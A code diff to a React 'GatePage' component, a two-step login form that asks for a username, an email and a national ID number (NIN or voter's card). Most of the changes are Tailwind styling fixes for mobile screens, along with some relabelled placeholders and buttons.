@@ -68,8 +68,11 @@ export default function GatePage() {
   };
 
   return (
-    <div className="min-h-screen bg-[#242730] flex items-center justify-center p-4">
-      <div className="w-full max-w-[420px]">
+    // Updated outer container to prevent mobile scroll issues
+    <div className="min-h-[100svh] min-h-[100dvh] w-full bg-[#242730] flex items-center justify-center px-4 py-6 overflow-y-auto">
+      
+      {/* Updated inner container to allow shrinking */}
+      <div className="w-full max-w-[420px] my-auto min-w-0">
         
         <div className="flex flex-col items-center mb-6">
           <div className="relative h-10 w-32 mb-4">
@@ -87,47 +90,62 @@ export default function GatePage() {
 
         {error && (
           <div className="bg-brand-red/10 border border-brand-red/20 text-brand-red text-sm p-3 rounded-md mb-4 flex items-center gap-2">
-            <AlertCircle size={16} /> {error}
+            <AlertCircle size={16} className="shrink-0" /> 
+            <span className="min-w-0">{error}</span>
           </div>
         )}
 
         {/* STEP 1 FORM */}
         {step === 1 && (
-          <form onSubmit={handleStep1} className="flex flex-col gap-3">
+          <form onSubmit={handleStep1} className="flex flex-col gap-3 w-full">
             
             <input
-              type="text" required value={username} onChange={(e) => setUsername(e.target.value)}
+              type="text" 
+              required 
+              value={username} 
+              onChange={(e) => setUsername(e.target.value)}
               placeholder="Username"
-              className="w-full bg-[#32363f] border border-transparent rounded-md py-3.5 px-4 text-white placeholder-gray-400 focus:outline-none focus:border-gray-500 transition-colors text-sm"
+              // Added text-base (16px to stop iOS zoom), w-full, min-w-0
+              className="w-full min-w-0 bg-[#32363f] border border-transparent rounded-md py-3.5 px-4 text-white placeholder-gray-400 focus:outline-none focus:border-gray-500 transition-colors text-base"
             />
 
             <input
-              type="email" required value={email} onChange={(e) => setEmail(e.target.value)}
+              type="email" 
+              required 
+              value={email} 
+              onChange={(e) => setEmail(e.target.value)}
               placeholder="Email Address"
-              className="w-full bg-[#32363f] border border-transparent rounded-md py-3.5 px-4 text-white placeholder-gray-400 focus:outline-none focus:border-gray-500 transition-colors text-sm"
+              className="w-full min-w-0 bg-[#32363f] border border-transparent rounded-md py-3.5 px-4 text-white placeholder-gray-400 focus:outline-none focus:border-gray-500 transition-colors text-base"
             />
 
             <input
-              type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
-              placeholder="Password"
-              className="w-full bg-[#32363f] border border-transparent rounded-md py-3.5 px-4 text-white placeholder-gray-400 focus:outline-none focus:border-gray-500 transition-colors text-sm"
+              type="text" 
+              required 
+              value={idNumber} 
+              onChange={(e) => setIdNumber(e.target.value)}
+              placeholder="Primary ID Number"
+              className="w-full min-w-0 bg-[#32363f] border border-transparent rounded-md py-3.5 px-4 text-white placeholder-gray-400 focus:outline-none focus:border-gray-500 transition-colors text-base"
             />
 
-            <button type="submit" disabled={loading}
-              className="mt-2 w-full bg-[#1a8035] hover:bg-[#156b2c] text-white text-sm font-medium py-3.5 rounded-md transition-colors flex justify-center items-center">
-              {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Login"}
+            <button 
+              type="submit" 
+              disabled={loading}
+              className="mt-2 w-full min-w-0 bg-[#1a8035] hover:bg-[#156b2c] text-white text-base font-medium py-3.5 rounded-md transition-colors flex justify-center items-center"
+            >
+              {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Get Passcode"}
             </button>
           </form>
         )}
 
         {/* STEP 2 FORM */}
         {step === 2 && (
-          <form onSubmit={handleStep2} className="flex flex-col gap-3">
+          <form onSubmit={handleStep2} className="flex flex-col gap-3 w-full">
             
-            <div className="relative">
+            <div className="relative w-full min-w-0">
               <select 
-                value={idType} onChange={(e) => setIdType(e.target.value)}
-                className="w-full bg-[#32363f] border border-transparent rounded-md py-3.5 pl-4 pr-10 text-white appearance-none focus:outline-none focus:border-gray-500 transition-colors text-sm cursor-pointer"
+                value={idType} 
+                onChange={(e) => setIdType(e.target.value)}
+                className="w-full min-w-0 bg-[#32363f] border border-transparent rounded-md py-3.5 pl-4 pr-10 text-white appearance-none focus:outline-none focus:border-gray-500 transition-colors text-base cursor-pointer"
               >
                 <option value="NIN">National Identity Number (NIN)</option>
                 <option value="Voter's Card">Permanent Voter's Card</option>
@@ -138,13 +156,19 @@ export default function GatePage() {
             </div>
 
             <input
-              type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
+              type="text" 
+              required 
+              value={idNumber} 
+              onChange={(e) => setIdNumber(e.target.value)}
               placeholder={`${idType} Number`}
-              className="w-full bg-[#32363f] border border-transparent rounded-md py-3.5 px-4 text-white placeholder-gray-400 focus:outline-none focus:border-gray-500 transition-colors text-sm"
+              className="w-full min-w-0 bg-[#32363f] border border-transparent rounded-md py-3.5 px-4 text-white placeholder-gray-400 focus:outline-none focus:border-gray-500 transition-colors text-base"
             />
 
-            <button type="submit" disabled={loading}
-              className="mt-2 w-full bg-[#1a8035] hover:bg-[#156b2c] text-white text-sm font-medium py-3.5 rounded-md transition-colors flex justify-center items-center">
+            <button 
+              type="submit" 
+              disabled={loading}
+              className="mt-2 w-full min-w-0 bg-[#1a8035] hover:bg-[#156b2c] text-white text-base font-medium py-3.5 rounded-md transition-colors flex justify-center items-center"
+            >
               {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Verify & Unlock"}
             </button>
           </form>
